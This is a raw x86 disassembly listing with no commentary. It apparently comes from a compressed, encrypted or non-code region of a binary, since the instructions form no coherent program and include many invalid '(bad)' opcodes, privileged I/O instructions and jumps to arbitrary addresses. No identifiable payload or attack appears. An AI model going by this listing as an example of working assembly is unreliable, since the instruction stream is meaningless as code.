  413496:	enter  0x1296,0xec
  41349a:	pop    edi
  41349b:	or     BYTE PTR [ecx-0xc],ah
  41349e:	xchg   BYTE PTR [ebx+0x69],ah
  4134a1:	test   BYTE PTR [esi+0x7a],0x12
  4134a5:	xor    eax,0x20c0bdd0
  4134aa:	add    eax,0xf7a9da4a
  4134af:	das    
  4134b0:	dec    edi
  4134b1:	in     eax,dx
  4134b2:	cli    
  4134b3:	enter  0xe49f,0xec
  4134b7:	iret   
  4134b8:	jmp    0x41348f
  4134ba:	mov    esp,0xeec874c1
  4134bf:	jno    0x413531
  4134c1:	fistp  DWORD PTR [ecx]
  4134c3:	dec    edx
  4134c4:	daa    
  4134c5:	hlt    
  4134c6:	je     0x413495
  4134c8:	mov    DWORD PTR [edi-0x42d49481],edx
  4134ce:	fstp   TBYTE PTR [edi+0x3184b92f]
  4134d4:	repz mov ds:0xac67a6cb,al
  4134da:	nop
  4134db:	xchg   ebp,eax
  4134dc:	xor    cl,bl
  4134de:	(bad)  
  4134df:	sti    
  4134e0:	mov    al,0xfc
  4134e2:	mov    eax,ds:0x91a66ef
  4134e7:	add    ah,BYTE PTR ds:0x116cf8d4
  4134ed:	jmp    0x41354b
  4134ef:	xor    DWORD PTR [ecx+0x31],esp
  4134f2:	pop    ebx
  4134f3:	das    
  4134f4:	jl     0x4134d0
  4134f6:	jno    0x4134b4
  4134f8:	jbe    0x4134a3
  4134fa:	lods   eax,DWORD PTR ds:[esi]
  4134fb:	sub    dl,0x11
  4134fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ff:	cdq    
  413500:	xor    al,0x90
  413502:	mul    esi
  413504:	fild   WORD PTR [edx]
  413506:	test   ah,dh
  413508:	jecxz  0x413497
  41350a:	std    
  41350b:	lods   al,BYTE PTR ds:[esi]
  41350c:	xchg   ebp,eax
  41350d:	mov    ah,dh
  41350f:	adc    ebp,DWORD PTR [edi]
  413511:	cmc    
  413512:	in     al,dx
  413513:	add    eax,0x98d77e28
  413518:	ret    
  413519:	leave  
  41351a:	cmc    
  41351b:	fwait
  41351c:	jae    0x4134ea
  41351e:	dec    esp
  41351f:	enter  0x2c6d,0xaa
  413523:	enter  0x57b3,0x60
  413527:	sbb    eax,0x92434655
  41352c:	out    dx,al
  41352d:	jbe    0x413533
  41352f:	add    edx,DWORD PTR [ebp-0x57]
  413532:	jmp    0xb38e:0x16459f85
  413539:	cmc    
  41353a:	sbb    DWORD PTR [edx-0x1e2c8ebc],ebx
  413540:	mov    DWORD PTR ds:0xe57f8545,eax
  413546:	nop
  413547:	mov    fs,WORD PTR [edx+esi*1]
  41354a:	jg     0x41352d
  41354c:	sbb    eax,0x9914d9da
  413551:	push   ebx
  413552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413553:	sbb    ch,BYTE PTR [ecx+0x7f]
  413556:	adc    eax,0xe97917e2
  41355b:	or     al,0x5c
  41355d:	mov    al,0xc8
  41355f:	adc    DWORD PTR [edx-0x7684837c],esi
  413565:	xchg   edi,eax
  413566:	and    DWORD PTR [edi+eiz*8],0xffffff86
  41356a:	fldcw  WORD PTR [ecx+0x4a17c519]
  413570:	dec    DWORD PTR [eax+0x75d2f700]
  413576:	adc    ah,BYTE PTR [ebx+0x73]
  413579:	(bad)  
  41357a:	mov    dl,0x40
  41357c:	pop    edi
  41357d:	cmp    DWORD PTR [esi+0x52aa9347],esi
  413583:	je     0x413561
  413585:	push   esp
  413586:	ins    DWORD PTR es:[edi],dx
  413587:	mov    bh,0xa4
  413589:	inc    esp
  41358a:	dec    esi
  41358b:	xor    edi,DWORD PTR [eax]
  41358d:	mov    ah,0xd3
  41358f:	push   0x3996c81c
  413594:	xchg   BYTE PTR [ebx],bh
  413596:	out    0xf1,al
  413598:	xchg   edx,eax
  413599:	sub    ebx,eax
  41359b:	outs   dx,DWORD PTR ds:[esi]
  41359c:	in     al,0xb0
  41359e:	xchg   esi,eax
  41359f:	aaa    
  4135a0:	scas   eax,DWORD PTR es:[edi]
  4135a1:	xchg   esp,eax
  4135a2:	xor    BYTE PTR [esp+edi*2],0xf0
  4135a6:	xchg   esi,eax
  4135a7:	and    edx,DWORD PTR [ecx+0x34e3106c]
  4135ad:	jno    0x4135d1
  4135af:	fwait
  4135b0:	inc    ecx
  4135b1:	icebp  
  4135b2:	outs   dx,DWORD PTR ds:[esi]
  4135b3:	pop    ds
  4135b4:	es aam 0xd4
  4135b7:	push   0x66
  4135b9:	pop    es
  4135ba:	mov    BYTE PTR [esi],dh
  4135bc:	mov    bl,0x1a
  4135be:	fisub  DWORD PTR [edi-0x61]
  4135c1:	std    
  4135c2:	mov    ah,0x7f
  4135c4:	jecxz  0x4135e4
  4135c6:	ds pop ebp
  4135c8:	dec    edi
  4135c9:	gs pop edx
  4135cb:	push   ebp
  4135cc:	xlat   BYTE PTR ds:[ebx]
  4135cd:	ins    BYTE PTR es:[edi],dx
  4135ce:	xor    BYTE PTR [edx-0x54],0x57
  4135d2:	mov    ds:0xd3c26d7d,al
  4135d7:	repz jno 0x4135fa
  4135da:	daa    
  4135db:	mov    bl,0xb3
  4135dd:	outs   dx,DWORD PTR ds:[esi]
  4135de:	xchg   DWORD PTR [ebp+0x1f4b0cce],esp
  4135e4:	out    0x48,eax
  4135e6:	dec    edx
  4135e7:	xor    eax,0xf9c83512
  4135ec:	push   ds
  4135ed:	lods   eax,DWORD PTR ds:[esi]
  4135ee:	fcom   QWORD PTR [edx-0x2b]
  4135f1:	ja     0x413636
  4135f3:	call   0xb9acae7c
  4135f8:	mov    ds:0xe4b67cea,eax
  4135fd:	mov    WORD PTR [esi+0x42e2dbf1],ds
  413603:	cmp    edx,edi
  413605:	in     eax,0xd0
  413607:	arpl   WORD PTR [ebp-0x27b98078],bp
  41360d:	out    0x96,al
  41360f:	dec    edx
  413610:	pop    ss
  413611:	aad    0x3
  413613:	inc    ecx
  413614:	(bad)  
  413615:	xrstors [ebx+ebp*8+0x7e]
  41361a:	out    dx,eax
  41361b:	sbb    eax,0xfc255b1d
  413620:	iret   
  413621:	and    bl,bh
  413623:	mov    ah,0xe
  413625:	push   0x68
  413627:	dec    eax
  413628:	jb     0x41363d
  41362a:	push   ebp
  41362b:	jb     0x4135e3
  41362d:	cmp    al,0xbb
  41362f:	ret    0xf44e
  413632:	daa    
  413633:	arpl   WORD PTR [esi],ax
  413635:	sahf   
  413636:	pop    edi
  413637:	out    0x37,al
  413639:	inc    esp
  41363a:	xor    al,0x20
  41363c:	sar    DWORD PTR [edx+0x3d86d582],0x78
  413643:	xchg   BYTE PTR [edi+esi*2],cl
  413646:	das    
  413647:	pushf  
  413648:	sub    eax,0x15adc709
  41364d:	pop    ds
  41364e:	in     eax,0x18
  413650:	addr16 jns 0x413696
  413653:	xor    BYTE PTR [edx],dh
  413655:	imul   esp
  413657:	mov    ah,0x56
  413659:	xor    al,0x5f
  41365b:	mov    bh,0x70
  41365d:	jecxz  0x4136da
  41365f:	dec    ebp
  413660:	lea    esi,ds:0x5d710f6c
  413666:	ret    
  413667:	pop    esi
  413668:	js     0x413671
  41366a:	pusha  
  41366b:	fwait
  41366c:	inc    ebx
  41366d:	aad    0xe0
  41366f:	(bad)  
  413670:	out    0x13,eax
  413672:	dec    esp
  413673:	sub    BYTE PTR [ecx-0xc],0xb
  413677:	or     edx,DWORD PTR [ebx+0x1172f535]
  41367d:	aad    0x3b
  41367f:	pop    ds
  413680:	push   ebx
  413681:	(bad)  
  413682:	(bad)  
  413683:	xchg   ecx,eax
  413684:	mov    edi,DWORD PTR [ebx-0x38]
  413687:	fwait
  413688:	or     DWORD PTR [ecx+eax*8],0x14
  41368c:	enter  0x52a8,0x28
  413690:	nop
  413691:	rcl    DWORD PTR [ebp+0x3c],cl
  413694:	in     al,0x3d
  413696:	dec    esi
  413697:	inc    esp
  413698:	fs sbb al,0xa6
  41369b:	div    BYTE PTR [edx+0x41f13540]
  4136a1:	xchg   esp,eax
  4136a2:	fcmovnbe st,st(3)
  4136a4:	mov    ds,WORD PTR [ebx-0x741ef8f6]
  4136aa:	fist   DWORD PTR [ebp-0x37a9eed3]
  4136b0:	out    dx,al
  4136b1:	pop    ebx
  4136b2:	xchg   edx,edi
  4136b4:	and    BYTE PTR ds:0x40eedfb3,0xcd
  4136bb:	cmp    al,BYTE PTR [ebp+0x56]
  4136be:	add    al,0xc9
  4136c0:	or     eax,0x7c5f3df8
  4136c5:	mov    DWORD PTR [edi-0x5b],ebx
  4136c8:	stos   DWORD PTR es:[edi],eax
  4136c9:	push   ebx
  4136ca:	imul   esi,esi,0xb159a5e0
  4136d0:	(bad)  
  4136d1:	cwde   
  4136d2:	fst    QWORD PTR [edx]
  4136d4:	fmul   DWORD PTR [edx-0x2]
  4136d7:	mov    cl,0x50
  4136d9:	sub    eax,0xa23be0b7
  4136de:	in     al,dx
  4136df:	pop    ss
  4136e0:	adc    al,0x2b
  4136e2:	loop   0x4136ee
  4136e4:	push   0xc6b0d94a
  4136e9:	mov    edi,0x13254811
  4136ee:	xchg   esp,eax
  4136ef:	retf   
  4136f0:	aad    0xcf
  4136f2:	xchg   ecx,eax
  4136f3:	imul   ebx,DWORD PTR [ebp+ebx*1-0x5d],0xffffffa8
  4136f8:	les    eax,FWORD PTR [ebx+eiz*1-0x714cd964]
  4136ff:	inc    ebp
  413700:	mov    bl,0x54
  413702:	cld    
  413703:	adc    ecx,0xfac86a49
  413709:	jp     0x41368d
  41370b:	mov    eax,ds:0xda692b2e
  413710:	or     eax,0x13ed755c
  413715:	push   edx
  413716:	mov    bh,0xaa
  413718:	lock mov cl,0x27
  41371b:	xor    dh,BYTE PTR [esp+edx*1+0x3f]
  41371f:	or     DWORD PTR ds:0xe9b8564b,eax
  413725:	mov    esp,0x7da6d3b8
  41372a:	xchg   edx,eax
  41372b:	jmp    0xed9b:0x3b805223
  413732:	loop   0x413747
  413734:	mov    ecx,0x7b8bdd4c
  413739:	adc    bh,BYTE PTR [ebx]
  41373b:	sbb    DWORD PTR [ecx+0x9e8a0a2],eax
  413741:	popa   
  413742:	push   0xffffffec
  413744:	mov    ds:0x5b1de212,eax
  413749:	test   eax,0xc322509
  41374e:	and    DWORD PTR [eax],ebp
  413750:	push   edx
  413751:	jp     0x4136fa
  413753:	jge    0x4136e2
  413755:	jle    0x41374d
  413757:	mov    cl,0x3f
  413759:	in     al,dx
  41375a:	dec    edi
  41375b:	retf   
  41375c:	jecxz  0x413734
  41375e:	ins    DWORD PTR es:[edi],dx
  41375f:	mov    edx,0x175c3347
  413764:	fs clc 
  413766:	ror    DWORD PTR [ecx-0x420dc850],cl
  41376c:	jo     0x4137ba
  41376e:	repnz test DWORD PTR [ecx+0x1d4eeab0],ebp
  413775:	and    dh,BYTE PTR [edx+0x5]
  413778:	aad    0x25
  41377a:	dec    edi
  41377b:	mov    dh,0xaf
  41377d:	xchg   edi,eax
  41377e:	iret   
  41377f:	pop    esp
  413780:	aas    
  413781:	popa   
  413782:	call   0xef5f198a
  413787:	sub    DWORD PTR [esi+0x37],0xffffff88
  41378b:	adc    eax,0xb4a764bf
  413790:	mov    edx,0x1b99a37c
  413795:	lahf   
  413796:	sub    BYTE PTR [eax],ch
  413798:	inc    esi
  413799:	mov    esi,0xa3d4a9a0
  41379e:	fdivr  st(5),st
  4137a0:	mov    WORD PTR [esi+0x6a34b4fb],fs
  4137a6:	jbe    0x4137f3
  4137a8:	pop    edx
  4137a9:	out    dx,eax
  4137aa:	(bad)  
  4137ab:	aam    0xc2
  4137ad:	shr    DWORD PTR [edx],1
  4137af:	push   cs
  4137b0:	iret   
  4137b1:	pop    edi
  4137b2:	adc    edi,DWORD PTR [edi]
  4137b4:	xchg   ecx,eax
  4137b5:	lea    esp,[eax-0x513c3d67]
  4137bb:	neg    DWORD PTR [edx-0x2e]
  4137be:	dec    edx
  4137bf:	cmp    BYTE PTR [ebp-0x6ccdfcf1],ch
  4137c5:	jecxz  0x413795
  4137c7:	pop    esi
  4137c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137c9:	imul   ebp,ebx,0xffffffff
  4137cc:	or     BYTE PTR [edx],bl
  4137ce:	jecxz  0x41377b
  4137d0:	mov    esi,0x74677608
  4137d5:	xchg   esp,eax
  4137d6:	jmp    0x9634d22f
  4137db:	xor    BYTE PTR [ecx-0x33],0x60
  4137df:	mov    ds:0xf223ad88,al
  4137e4:	cdq    
  4137e5:	js     0x41377a
  4137e7:	bound  ebp,QWORD PTR [ebx+ebp*8-0x15304d74]
  4137ee:	out    dx,eax
  4137ef:	das    
  4137f0:	std    
  4137f1:	sbb    BYTE PTR [edx],0x13
  4137f4:	outs   dx,BYTE PTR ds:[esi]
  4137f5:	scas   al,BYTE PTR es:[edi]
  4137f6:	pusha  
  4137f7:	stc    
  4137f8:	push   cs
  4137f9:	push   0x5cd97b9f
  4137fe:	xchg   ebp,eax
  4137ff:	sbb    dl,bl
  413801:	mov    ecx,0x193eec14
  413806:	inc    esp
  413807:	mov    ah,0x66
  413809:	pop    ss
  41380a:	mov    dl,0x5c
  41380c:	in     al,dx
  41380d:	or     DWORD PTR [eax-0x73c4f938],ebx
  413813:	loope  0x4137dc
  413815:	jo     0x413865
  413817:	fbstp  TBYTE PTR [edx-0x4]
  41381a:	mov    ds:0xe497d69d,eax
  41381f:	pop    es
  413820:	jo     0x4137f7
  413822:	push   ds
  413823:	or     bh,BYTE PTR [edi-0x48]
  413826:	retf   
  413827:	nop    DWORD PTR [edi+0x4]
  41382b:	or     eax,0xfaa9673e
  413830:	xchg   ebp,eax
  413831:	jns    0x413887
  413833:	dec    ebp
  413834:	adc    eax,0x9d12a6ea
  413839:	mov    bh,0x35
  41383b:	and    al,0x7a
  41383d:	sbb    ebp,edi
  41383f:	dec    esi
  413840:	adc    ah,BYTE PTR [edx]
  413842:	xor    dl,BYTE PTR [ecx]
  413844:	mov    ds:0x7c909593,eax
  413849:	jne    0x413893
  41384b:	aas    
  41384c:	xor    BYTE PTR [edx],dh
  41384e:	mov    ebx,0x4849adce
  413853:	mov    ds:0xd2bce0cf,al
  413858:	xchg   esp,eax
  413859:	xor    eax,0xbb004728
  41385e:	stos   DWORD PTR es:[edi],eax
  41385f:	xor    al,0xde
  413861:	adc    eax,esp
  413863:	sbb    al,0xa8
  413865:	dec    dl
  413867:	cld    
  413868:	(bad)  
  413869:	xor    al,0x11
  41386b:	dec    esp
  41386c:	mov    ebx,0xeb047a1f
  413871:	fnstsw WORD PTR [ecx+esi*2+0x1b]
  413875:	jge    0x41387b
  413877:	shr    BYTE PTR fs:0x41ee98e1,0xa5
  41387f:	repnz ins BYTE PTR es:[edi],dx
  413881:	int    0x60
  413883:	mov    bh,0x1f
  413885:	repz and BYTE PTR [edx-0x43d77543],ch
  41388c:	sbb    al,0xb1
  41388e:	sahf   
  41388f:	test   BYTE PTR [eax-0x11c23c05],ch
  413895:	xchg   esp,eax
  413896:	sub    eax,0x74f1a1f2
  41389b:	pop    esi
  41389c:	jmp    0x2eb9a750
  4138a1:	loopne 0x41391a
  4138a3:	in     eax,0x3
  4138a5:	xchg   esp,eax
  4138a6:	xchg   edi,eax
  4138a7:	jne    0x4138ee
  4138a9:	xor    ch,cl
  4138ab:	add    eax,0x9ae22d3f
  4138b0:	push   ss
  4138b1:	test   al,0x30
  4138b3:	int3   
  4138b4:	arpl   WORD PTR [edi+0x41],bp
  4138b7:	fld1   
  4138b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138ba:	sbb    al,0xb7
  4138bc:	pop    ss
  4138bd:	(bad)  
  4138be:	xor    dh,ah
  4138c0:	js     0x413928
  4138c2:	or     dl,BYTE PTR [edi-0x5e]
  4138c5:	test   DWORD PTR [esi+0x2a],ebp
  4138c8:	cwde   
  4138c9:	hlt    
  4138ca:	sub    eax,0x8d2e2d6b
  4138cf:	sbb    DWORD PTR cs:[esi-0x1d],esi
  4138d3:	and    DWORD PTR [ebx+0x1f29268a],esp
  4138d9:	jb     0x413865
  4138db:	hlt    
  4138dc:	pop    esp
  4138dd:	int3   
  4138de:	pop    es
  4138df:	icebp  
  4138e0:	retf   0x144d
  4138e3:	iret   
  4138e4:	pop    ecx
  4138e5:	lock ret 0xa4b0
  4138e9:	add    BYTE PTR [eax+0x4c],dh
  4138ec:	scas   eax,DWORD PTR es:[edi]
  4138ed:	test   eax,0xc49fab56
  4138f2:	loope  0x413890
  4138f4:	dec    edi
  4138f5:	sbb    esp,DWORD PTR [esi]
  4138f7:	mov    bh,BYTE PTR [edx-0x2b]
  4138fa:	xlat   BYTE PTR ds:[ebx]
  4138fb:	mov    edi,0xbcef0a20
  413900:	lahf   
  413901:	pop    ecx
  413902:	mov    esi,0x8f267160
  413907:	ficomp DWORD PTR [esi+0x1f]
  41390a:	push   cs
  41390b:	rol    BYTE PTR [ebp+0x10d91248],0x7
  413912:	retf   
  413913:	xchg   ebx,eax
  413914:	bound  esi,QWORD PTR [esi]
  413916:	jle    0x413936
  413918:	fwait
  413919:	dec    eax
  41391a:	(bad)  
  41391b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41391c:	mov    dh,0x14
  41391e:	or     al,BYTE PTR ds:0xe9d5c29e
  413924:	mov    ss:0x389af004,al
  41392a:	out    0x34,eax
  41392c:	out    dx,al
  41392d:	inc    esp
  41392e:	xchg   DWORD PTR [ecx+0x5b3acf9],ecx
  413934:	or     dh,BYTE PTR [edx-0x6e]
  413937:	test   ch,dl
  413939:	xchg   esp,eax
  41393a:	cwde   
  41393b:	cmc    
  41393c:	imul   esi,DWORD PTR [eax+0x6c],0xffffffa3
  413940:	cli    
  413941:	cld    
  413942:	out    0x3d,eax
  413944:	fld    QWORD PTR [ebp+0x28]
  413947:	push   ss
  413948:	sti    
  413949:	test   al,0x73
  41394b:	pop    ebp
  41394c:	sti    
  41394d:	pop    ebx
  41394e:	ja     0x413918
  413950:	call   0x2e1fdc1d
  413955:	jge    0x413994
  413957:	jno    0x41393e
  413959:	jmp    0x4138ff
  41395b:	mov    BYTE PTR [ebx-0x6c0f1d5e],al
  413961:	adc    eax,0x6ad15391
  413966:	stc    
  413967:	and    ecx,ebx
  413969:	dec    ecx
  41396a:	int3   
  41396b:	stc    
  41396c:	scas   al,BYTE PTR es:[edi]
  41396d:	lds    esi,FWORD PTR [eax+ebp*1-0x1f70d7ba]
  413974:	dec    edi
  413975:	sbb    edi,DWORD PTR [ebx-0x12b9b47e]
  41397b:	adc    DWORD PTR [ecx+0x6e],ebp
  41397e:	fisubr WORD PTR [esi-0x26]
  413981:	inc    ecx
  413982:	add    bl,BYTE PTR [ecx-0x3b]
  413985:	jb     0x4139d5
  413987:	(bad)  
  413988:	sahf   
  413989:	mov    dh,0x54
  41398b:	adc    BYTE PTR [ecx-0x30],al
  41398e:	je     0x413992
  413990:	push   ebp
  413991:	jmp    0x41398f
  413993:	jge    0x41392c
  413995:	mov    eax,ds:0x308f3034
  41399a:	dec    ebp
  41399b:	mov    ch,0xd9
  41399d:	and    BYTE PTR [ebp+0x7],al
  4139a0:	cmp    eax,0xc6292f98
  4139a5:	mov    BYTE PTR [edx+edi*1],dh
  4139a8:	shr    DWORD PTR [eax],1
  4139aa:	stos   DWORD PTR es:[edi],eax
  4139ab:	in     al,0x6d
  4139ad:	inc    edx
  4139ae:	aaa    
  4139af:	mov    edx,0xdf698e40
  4139b4:	xchg   ecx,eax
  4139b5:	fidiv  DWORD PTR [ebp+0x2a]
  4139b8:	push   eax
  4139b9:	inc    esp
  4139ba:	div    BYTE PTR [esi+0x51170ae1]
  4139c0:	fs push edx
  4139c2:	and    BYTE PTR [ecx],ah
  4139c4:	test   al,0xe9
  4139c6:	xlat   BYTE PTR ds:[ebx]
  4139c7:	xchg   esp,eax
  4139c8:	mov    dl,dl
  4139ca:	push   ss
  4139cb:	mov    dl,0xf9
  4139cd:	jbe    0x41396d
  4139cf:	inc    ebx
  4139d0:	and    BYTE PTR [edi-0x37351848],bl
  4139d6:	fimul  WORD PTR [ebp+0xae6942a]
  4139dc:	cli    
  4139dd:	add    ecx,DWORD PTR [eax-0x64]
  4139e0:	shr    ch,cl
  4139e2:	out    0xe,al
  4139e4:	xchg   esp,eax
  4139e5:	xor    DWORD PTR [ebx-0x2256e88],0x14
  4139ec:	cmp    ah,ch
  4139ee:	dec    esi
  4139ef:	xor    bh,BYTE PTR [eax]
  4139f1:	int    0xc9
  4139f3:	shl    BYTE PTR [eax+0x76],0x2d
  4139f7:	imul   ebp,DWORD PTR [esi+0x5cc10b03],0x63be358e
  413a01:	xchg   ebx,eax
  413a02:	jb     0x4139e3
  413a04:	jbe    0x4139a5
  413a06:	aas    
  413a07:	or     edx,ebx
  413a09:	and    bl,BYTE PTR [edi]
  413a0b:	lahf   
  413a0c:	int3   
  413a0d:	cmp    esp,DWORD PTR [ecx+0x4b]
  413a10:	arpl   WORD PTR [ebx-0x58],bx
  413a13:	mov    eax,0x5ab1195b
  413a18:	push   ebx
  413a19:	push   edx
  413a1a:	mov    dl,0xf4
  413a1c:	xchg   edi,eax
  413a1d:	cld    
  413a1e:	jb     0x413a56
  413a20:	in     eax,0x8
  413a22:	sbb    ebp,DWORD PTR [eax+0x1e986b2f]
  413a28:	jne    0x4139d5
  413a2a:	xchg   ebx,eax
  413a2b:	adc    esp,DWORD PTR [esi+0x6cd77fbd]
  413a31:	popf   
  413a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a33:	add    al,0x2b
  413a35:	sbb    BYTE PTR [eax+0x2d],ah
  413a38:	sub    eax,0x951da00e
  413a3d:	mov    ch,0x67
  413a3f:	mov    esp,0x81e4ae9
  413a44:	je     0x413ab0
  413a46:	out    dx,eax
  413a47:	inc    eax
  413a48:	jmp    0x90641222
  413a4d:	or     al,0xed
  413a4f:	(bad)  
  413a50:	repnz (bad) 
  413a52:	aam    0x82
  413a54:	or     al,0x61
  413a56:	mov    esp,0x224be8b4
  413a5b:	ss loopne 0x413a00
  413a5e:	pop    ebp
  413a60:	popf   
  413a61:	mov    BYTE PTR [edx-0x1b572456],cl
  413a67:	push   esp
  413a68:	fld    st(7)
  413a6a:	push   0xb
  413a6c:	pusha  
  413a6d:	fcomp  QWORD PTR [esi-0x7ebdb843]
  413a73:	push   ebx
  413a74:	aam    0x88
  413a76:	dec    ecx
  413a77:	pop    ss
  413a78:	call   0x7348:0x4fbdac31
  413a7f:	loopne 0x413a47
  413a81:	dec    ecx
  413a82:	into   
  413a83:	adc    ebp,DWORD PTR [ebp+ebp*2-0x1f]
  413a87:	mov    dl,0xa6
  413a89:	loope  0x413a26
  413a8b:	mov    ebx,ecx
  413a8d:	mov    al,ds:0xeaab0f59
  413a92:	jnp    0x413ab9
  413a94:	mov    bl,0xe1
  413a96:	jle    0x413b15
  413a98:	push   ecx
  413a99:	addr16 js 0x413a1e
  413a9c:	pop    esp
  413a9d:	cmp    bl,BYTE PTR [edi]
  413a9f:	pop    ebp
  413aa0:	xchg   edx,eax
  413aa1:	addr16 push ebp
  413aa3:	arpl   WORD PTR [ebx+0x41],cx
  413aa6:	mov    edi,edx
  413aa8:	cwde   
  413aa9:	stc    
  413aaa:	jmp    0x41ee:0x9901147c
  413ab1:	je     0x413ac4
  413ab3:	push   0x66
  413ab5:	mov    bl,0xa1
  413ab7:	iret   
  413ab8:	out    dx,eax
  413ab9:	es (bad) 
  413abb:	iret   
  413abc:	mov    BYTE PTR ss:[esp+ecx*2-0xb3c3522],ah
  413ac4:	xchg   edx,eax
  413ac5:	mov    edx,DWORD PTR [ebp-0x6f7a5bdf]
  413acb:	adc    BYTE PTR [esi-0x7f],dh
  413ace:	test   eax,0x965f967d
  413ad3:	aas    
  413ad4:	loope  0x413ac7
  413ad6:	and    al,BYTE PTR [edx-0x8467fbd]
  413adc:	cmp    BYTE PTR [ebx+0x3491a8c3],bh
  413ae2:	or     al,0x5f
  413ae4:	imul   esp,DWORD PTR [esi+0x7a871c37],0x6b5eabde
  413aee:	add    BYTE PTR [edi],bl
  413af0:	in     al,dx
  413af1:	adc    al,0x77
  413af3:	xchg   edx,eax
  413af4:	mov    ecx,0x412c68ec
  413af9:	add    eax,0x15cb9f8a
  413afe:	jne    0x413a98
  413b00:	jecxz  0x413b5a
  413b02:	push   cs
  413b03:	push   eax
  413b04:	xchg   edi,eax
  413b05:	pop    ss
  413b06:	imul   edx,DWORD PTR [esi-0x6d9a9fe5],0xffffff81
  413b0d:	xchg   edx,eax
  413b0e:	sbb    DWORD PTR [ecx],0xffffff97
  413b11:	mov    ds:0x805da051,eax
  413b16:	adc    al,0x58
  413b18:	mov    ebp,0xf2e66275
  413b1d:	sahf   
  413b1e:	(bad)  
  413b1f:	push   ebp
  413b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b21:	mov    bh,0x2e
  413b23:	lock pop edx
  413b25:	hlt    
  413b26:	push   0xffffffc0
  413b28:	cld    
  413b29:	xor    ch,BYTE PTR [ebp-0x26]
  413b2c:	dec    edx
  413b2d:	retf   0x402d
  413b30:	loopne 0x413b86
  413b32:	mov    esp,0x7a626805
  413b37:	lods   eax,DWORD PTR ds:[esi]
  413b38:	pop    edi
  413b39:	scas   al,BYTE PTR es:[edi]
  413b3a:	xchg   dl,bh
  413b3c:	sub    BYTE PTR [esi],dl
  413b3e:	inc    esp
  413b3f:	inc    ebp
  413b40:	and    al,0xb5
  413b42:	int    0xc5
  413b44:	mov    ds:0x81a0ca7,eax
  413b49:	and    al,0x94
  413b4b:	mov    WORD PTR ds:0xa88b14a0,gs
  413b51:	cmp    ebp,esp
  413b53:	pop    ebx
  413b54:	int    0x25
  413b56:	int    0x96
  413b58:	mov    ah,0x39
  413b5a:	rcr    DWORD PTR [edx+ebx*4+0x79],0xe3
  413b5f:	add    BYTE PTR [eax+0x371d304],dl
  413b65:	lea    eax,[edi]
  413b67:	lods   eax,DWORD PTR ds:[esi]
  413b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b69:	sbb    eax,0xbd662ffc
  413b6e:	cmp    ebx,DWORD PTR [eax-0x4004b6aa]
  413b74:	idiv   ecx
  413b76:	xchg   ebx,eax
  413b77:	and    al,bl
  413b79:	dec    edi
  413b7a:	push   ds
  413b7b:	add    BYTE PTR ds:[esi-0x7cbb175e],ch
  413b82:	std    
  413b83:	jl     0x413b8c
  413b85:	pop    ecx
  413b87:	push   0xd
  413b89:	mov    edi,0x8787e6fe
  413b8e:	shr    DWORD PTR [edi],cl
  413b90:	mov    dh,0x43
  413b92:	pop    esi
  413b93:	out    0xde,eax
  413b95:	shl    BYTE PTR [ebx-0x402f3d2],cl
  413b9b:	test   DWORD PTR [edx+0x169a9d10],esp
  413ba1:	adc    edx,DWORD PTR [ecx+0x5d9422c8]
  413ba7:	add    dl,BYTE PTR [esi]
  413ba9:	sbb    dh,dh
  413bab:	sub    eax,0xe882eb5
  413bb0:	xchg   edi,eax
  413bb1:	js     0x413b6c
  413bb3:	mov    ah,0x1a
  413bb5:	into   
  413bb6:	mov    es,WORD PTR [edx-0x7d203d17]
  413bbc:	retf   
  413bbd:	dec    esp
  413bbe:	and    BYTE PTR [eax-0x2d],dl
  413bc1:	add    DWORD PTR [edi-0x60],0xebcc70b0
  413bc8:	(bad)  [ecx+0xd]
  413bcb:	mov    al,0x3e
  413bcd:	loopne 0x413baf
  413bcf:	mov    BYTE PTR [edx-0x47],al
  413bd2:	and    BYTE PTR cs:[ecx-0x58e37b1a],ch
  413bd9:	jns    0x413c17
  413bdb:	out    dx,eax
  413bdc:	ror    BYTE PTR [edx+esi*4-0x43a4abf6],1
  413be3:	mov    cl,0xe3
  413be5:	cmp    ebp,eax
  413be7:	sub    DWORD PTR [ecx],ecx
  413be9:	pop    edx
  413bea:	ja     0x413c3d
  413bec:	lods   eax,DWORD PTR ds:[esi]
  413bed:	dec    ecx
  413bee:	mov    gs,WORD PTR [ecx-0x56]
  413bf1:	dec    edx
  413bf2:	xlat   BYTE PTR ds:[ebx]
  413bf3:	popf   
  413bf4:	sar    DWORD PTR [esi-0x6c],0x46
  413bf8:	add    BYTE PTR [esi+esi*4+0x6e4d7d36],ch
  413bff:	xor    eax,0x25ba6a8f
  413c04:	lods   al,BYTE PTR ds:[esi]
  413c05:	adc    ch,BYTE PTR [esi]
  413c07:	mov    ch,0x96
  413c09:	ret    
  413c0a:	sub    al,0x8d
  413c0c:	sub    ch,BYTE PTR [edx-0x33]
  413c0f:	jle    0x413c41
  413c11:	sbb    edi,eax
  413c13:	es mov eax,esi
  413c16:	sti    
  413c17:	jmp    0x6bd4:0xea889fb3
  413c1e:	leave  
  413c1f:	jg     0x413be2
  413c21:	sub    DWORD PTR [ecx-0x6c],ebx
  413c24:	dec    ebp
  413c25:	sub    ah,ah
  413c27:	dec    edi
  413c28:	fimul  DWORD PTR [esi+edx*2]
  413c2b:	jns    0x413c3e
  413c2d:	pop    ds
  413c2e:	stos   DWORD PTR es:[edi],eax
  413c2f:	or     DWORD PTR [ebx-0x71b0f57f],0xf73734eb
  413c39:	sub    cl,BYTE PTR [eax]
  413c3b:	aam    0xe2
  413c3d:	pop    ds
  413c3e:	es push cs
  413c40:	pop    esi
  413c41:	cmp    eax,0x7ef2b10e
  413c46:	out    0xcc,eax
  413c48:	cld    
  413c49:	(bad)  
  413c4a:	adc    al,BYTE PTR [ebx-0x2bce9551]
  413c50:	xor    ebp,DWORD PTR [edi+0x4f]
  413c53:	inc    ecx
  413c54:	mov    dh,0x61
  413c56:	popf   
  413c57:	pop    ebx
  413c58:	mov    al,0xb7
  413c5a:	(bad)  
  413c5b:	adc    cl,BYTE PTR [edx]
  413c5d:	or     bl,ah
  413c5f:	arpl   si,bp
  413c61:	ret    
